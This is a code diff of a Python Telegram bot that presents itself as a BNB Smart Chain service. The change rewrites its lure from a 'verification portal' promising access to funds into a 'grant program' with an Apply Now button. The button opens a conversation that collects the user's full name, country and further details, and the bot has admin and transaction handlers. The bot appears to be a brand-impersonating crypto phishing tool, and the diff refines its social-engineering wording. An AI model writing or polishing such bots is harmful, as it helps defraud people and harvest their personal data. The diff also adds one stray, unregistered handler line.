@@ -57,14 +57,27 @@ conn.commit()
 # =========================
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    context.user_data.clear()
+    keyboard = [
+        [InlineKeyboardButton("Apply Now", callback_data="apply_now")]
+    ]
 
     await update.message.reply_text(
-    "🔐 Welcome to BNB Smart Chain Verification Portal.\n\n"
-    "Complete verification to confirm your eligibility and access your funds.\n\n"
-    "Please provide the required information.\n\n"
-    "Enter your Full Name:"
-)
+        "Welcome to the BNB Smart Chain Grant Program!\n\n"
+        "We're pleased to have you here. If you're interested in applying for a grant, complete the application form and submit the required information for review.\n\n"
+        "Applications are evaluated based on the program's eligibility criteria.\n\n"
+        "Tap \"Apply Now\" to begin your application.",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+    return ConversationHandler.END
+
+async def apply_now(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+
+    await query.message.reply_text(
+        "Enter your Full Name:"
+    )
 
     return NAME
 
@@ -427,7 +440,10 @@ async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
 app = Application.builder().token(TOKEN).build()
 
 conv_handler = ConversationHandler(
-    entry_points=[CommandHandler("start", start)],
+    entry_points=[
+    CommandHandler("start", start),
+    CallbackQueryHandler(apply_now, pattern="^apply_now$")
+],
     states={
     NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_name)],
     COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_country)],
@@ -446,6 +462,7 @@ conv_handler = ConversationHandler(
 )
 
 app.add_handler(conv_handler)
+CallbackQueryHandler(apply_now, pattern="^apply_now$")
 app.add_handler(CallbackQueryHandler(admin_buttons))
 app.add_handler(CommandHandler("tx", tx))
 app.add_handler(CommandHandler("status", status))
